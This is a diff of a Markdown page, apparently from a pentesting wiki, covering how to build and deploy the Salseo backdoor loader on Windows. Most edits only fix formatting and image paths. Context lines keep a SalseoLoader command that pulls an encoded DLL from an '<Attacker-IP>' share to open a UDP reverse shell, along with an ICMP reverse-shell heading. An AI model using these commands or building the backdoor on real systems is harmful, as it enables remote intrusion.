@@ -12,13 +12,13 @@ Compile those projects for the architecture of the windows box where your are go
 
 You can **select the architecture** inside Visual Studio in the **left "Build" Tab** in **"Platform Target".**
 
-**(**If you can't find this options press in **"Project Tab"** and then in **"\<Project Name> Properties"**)
+\*\*(\*\*If you can't find this options press in **"Project Tab"** and then in **"\<Project Name> Properties"**)
 
-![](../.gitbook/assets/image.png)
+![](<../.gitbook/assets/image (4) (1).png>)
 
 Then, build both projects (Build -> Build Solution) (Inside the logs will appear the path of the executable):
 
-![](<../.gitbook/assets/image (1).png>)
+![](<../.gitbook/assets/image (1) (1) (1).png>)
 
 ## Prepare the Backdoor
 
@@ -62,7 +62,7 @@ SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <A
 
 ### **Getting a ICMP reverse shell (encoded dll already inside the victim)**
 
-**This time you need a special tool in the client to receive the reverse shell. Download:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)****
+**This time you need a special tool in the client to receive the reverse shell. Download:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **Disable ICMP Replies:**
 
@@ -91,17 +91,17 @@ Open the SalseoLoader project using Visual Studio.
 
 ### Add before the main function: \[DllExport]
 
-![](<../.gitbook/assets/image (2).png>)
+![](<../.gitbook/assets/image (2) (1) (1).png>)
 
 ### Install DllExport for this project
 
 #### **Tools** --> **NuGet Package Manager** --> **Manage NuGet Packages for Solution...**
 
-![](<../.gitbook/assets/image (3).png>)
+![](<../.gitbook/assets/image (3) (1).png>)
 
 #### **Search for DllExport package (using Browse tab), and press Install (and accept the popup)**
 
-![](<../.gitbook/assets/image (4).png>)
+![](<../.gitbook/assets/image (4) (1) (1).png>)
 
 In your project folder have appeared the files: **DllExport.bat** and **DllExport\_Configure.bat**
 
@@ -109,7 +109,7 @@ In your project folder have appeared the files: **DllExport.bat** and **DllExpor
 
 Press **Uninstall** (yeah, its weird but trust me, it is necessary)
 
-![](<../.gitbook/assets/image (5).png>)
+![](<../.gitbook/assets/image (5) (1).png>)
 
 ### **Exit Visual Studio and execute DllExport\_configure**
 
@@ -125,7 +125,7 @@ Select **x64** (if you are going to use it inside a x64 box, that was my case), 
 
 **\[DllExport]** should not be longer marked as error
 
-![](<../.gitbook/assets/image (8).png>)
+![](<../.gitbook/assets/image (8) (1).png>)
 
 ### Build the solution
 
